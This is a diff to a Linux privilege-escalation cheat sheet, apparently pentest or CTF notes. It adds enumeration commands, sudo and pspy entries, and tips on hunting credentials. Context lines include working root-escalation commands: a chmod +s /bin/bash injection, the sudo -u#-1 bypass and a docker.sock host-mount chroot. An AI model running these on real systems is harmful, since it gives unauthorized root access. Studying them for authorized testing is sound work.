@@ -80,6 +80,12 @@ echo "chmod +s /bin/bash" >> script.sh
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
+or  
+```
+id
+find / -perm -u=s -type f -group <group> 2>/dev/null
+
+```
 
 -> Exploitation  
 https://gtfobins.github.io/
@@ -89,6 +95,7 @@ https://gtfobins.github.io/
 ```
 getcap -r / 2>/dev/null
 ```
+
 -> Exploitation  
 https://gtfobins.github.io/
 
@@ -100,8 +107,14 @@ or
 ```
 cat /etc/sudoers
 ```
+
 -> Exploitation  
 https://gtfobins.github.io/
+
+#### Run commands as another user with permission through sudo [PrivEsc]
+```
+sudo -u <username> <command>
+```
 
 ### Weak File Permissions / Passwd Writabble [PrivEsc]
 -> Enumeration  
@@ -147,7 +160,7 @@ chmod +s /tmp/1/x
 -> Exploitation - VM Owned
 ```
 /tmp/x
- id
+id
 ```
 
 ### sudo < v1.28 - @sickrov [PrivEsc]
@@ -160,25 +173,33 @@ sudo -u#-1 /bin/bash
 ```
 find / -name docker.sock 2>/dev/null
 ```
+
 -> list images  
 ```
 docker images
 ```
+
 -> Exploitation
 ```
 docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
 ```
 
 ### Other Tips
-In Construction [X]
+-> Perform code review on web server files (/var/www/html);
+-> Check log files for credentials;
 
 ### Linux Enumeration Tools [PrivEsc]
-
 -> Linpeas
 ```
 ./linpeas.sh
 ```
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+-> pspy (unprivileged Linux process snooping)  
+```
+./pspy64
+```
+https://github.com/DominicBreuker/pspy
 
 -> linux-exploit-suggester
 ```
